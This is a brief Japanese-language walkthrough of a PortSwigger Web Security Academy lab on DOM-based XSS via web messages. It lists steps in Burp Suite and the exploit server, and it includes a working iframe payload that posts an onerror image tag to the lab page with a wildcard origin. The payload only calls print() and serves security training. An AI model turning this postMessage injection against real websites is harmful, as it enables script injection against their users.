# Web メッセージを使用した DOM XSS

次のハッキングラボを実施する  
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages  
このラボでは、単純な Web メッセージの脆弱性を示します。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. エクスプロイトサーバに移動します
- 4. ボディに次の内容を入力します

```html
<iframe src="https://0a64006f0422081480467b3900800098.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```

- 5. Store ボタンを押して、deliver exploit to victim ボタンを押下します
